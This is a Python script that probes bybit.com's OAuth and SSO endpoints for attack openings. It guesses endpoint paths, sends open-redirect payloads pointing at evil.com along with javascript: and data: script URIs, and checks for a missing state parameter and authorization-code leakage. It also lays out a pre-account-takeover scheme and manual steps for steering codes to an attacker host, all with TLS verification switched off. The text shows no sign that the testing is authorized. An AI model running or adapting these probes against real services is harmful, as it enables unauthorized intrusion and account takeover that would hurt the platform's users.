#!/usr/bin/env python3
"""
OAuth/SSO Attack Vectors:
1. Open Redirect via redirect_uri
2. Account Takeover via pre-account takeover
3. State parameter bypass (CSRF)
4. Authorization code leakage
5. PKCE bypass
"""
import requests
import urllib.parse

BASE_URL = "https://www.bybit.com"
requests.packages.urllib3.disable_warnings()

print("="*80)
print("OAUTH/SSO VULNERABILITY TESTING")
print("="*80)

# Common OAuth endpoints
oauth_endpoints = [
    "/oauth/authorize",
    "/oauth/token",
    "/oauth/callback",
    "/api/oauth/authorize",
    "/api/auth/google",
    "/api/auth/apple",
    "/api/auth/telegram",
    "/login/oauth/authorize",
    "/sso/authorize",
]

print("\n[1] Discovering OAuth Endpoints")
print("-" * 80)

found_endpoints = []

for endpoint in oauth_endpoints:
    try:
        r = requests.get(f"{BASE_URL}{endpoint}", verify=False, timeout=3, allow_redirects=False)
        
        if r.status_code not in [404, 403]:
            print(f"✓ Found: {endpoint} (Status: {r.status_code})")
            found_endpoints.append(endpoint)
            
            if 'Location' in r.headers:
                print(f"  → Redirects to: {r.headers['Location'][:100]}")
                
    except:
        pass

# Test Open Redirect in redirect_uri
print("\n\n[2] Testing Open Redirect via redirect_uri")
print("-" * 80)

open_redirect_payloads = [
    "https://evil.com",
    "https://evil.com@bybit.com",
    "https://bybit.com.evil.com",
    "//evil.com",
    "///evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

for endpoint in found_endpoints:
    for payload in open_redirect_payloads[:3]:  # Test first 3
        try:
            params = {
                "redirect_uri": payload,
                "client_id": "test",
                "response_type": "code",
                "state": "test123"
            }
            
            r = requests.get(
                f"{BASE_URL}{endpoint}",
                params=params,
                verify=False,
                timeout=3,
                allow_redirects=False
            )
            
            location = r.headers.get('Location', '')
            
            if 'evil.com' in location:
                print(f"\n🚨 OPEN REDIRECT FOUND!")
                print(f"  Endpoint: {endpoint}")
                print(f"  Payload: {payload}")
                print(f"  Location: {location}")
                
        except:
            pass

# Test State parameter bypass
print("\n\n[3] Testing State Parameter Bypass (CSRF)")
print("-" * 80)

for endpoint in found_endpoints:
    try:
        # Request without state parameter
        params = {
            "client_id": "test",
            "redirect_uri": f"{BASE_URL}/callback",
            "response_type": "code"
        }
        
        r = requests.get(
            f"{BASE_URL}{endpoint}",
            params=params,
            verify=False,
            timeout=3
        )
        
        if r.status_code == 200:
            if 'state' not in r.text.lower() or 'required' not in r.text.lower():
                print(f"⚠️  {endpoint} may not require state parameter!")
                
    except:
        pass

# Test Authorization Code in URL
print("\n\n[4] Testing Authorization Code Leakage")
print("-" * 80)

callback_endpoints = [
    "/oauth/callback",
    "/auth/callback",
    "/callback",
]

for endpoint in callback_endpoints:
    try:
        # Simulate callback with code in URL
        r = requests.get(
            f"{BASE_URL}{endpoint}?code=test_code&state=test",
            verify=False,
            timeout=3,
            allow_redirects=False
        )
        
        location = r.headers.get('Location', '')
        
        # Check if code is leaked in redirect
        if 'code=' in location and 'test_code' in location:
            print(f"⚠️  {endpoint} leaks authorization code in redirect!")
            print(f"  Location: {location[:150]}")
            
    except:
        pass

# Test Account Pre-Takeover
print("\n\n[5] Testing Account Pre-Takeover")
print("-" * 80)

print("""
Account Pre-Takeover scenario:
1. Attacker creates account with victim@example.com (unverified)
2. Attacker links OAuth (Google) to this account
3. Victim tries to login via OAuth
4. System sees email exists and links to attacker's account
5. Attacker can now access victim's OAuth-authenticated session

This requires manual testing:
- Create account with victim email (without verification)
- Link OAuth provider
- Have victim login via OAuth
- Check if attacker gains access
""")

# Check if email verification is enforced before OAuth linking
try:
    # This would need authenticated request
    print("Cannot test without authenticated session")
except:
    pass

print("\n" + "="*80)
print("OAUTH TESTING COMPLETE")
print("\nNext: Manually test OAuth flow:")
print("1. Start OAuth login (Google/Apple/Telegram)")
print("2. Intercept redirect_uri parameter")
print("3. Try to modify it to evil.com")
print("4. Check if authorization code leaks")
print("="*80)
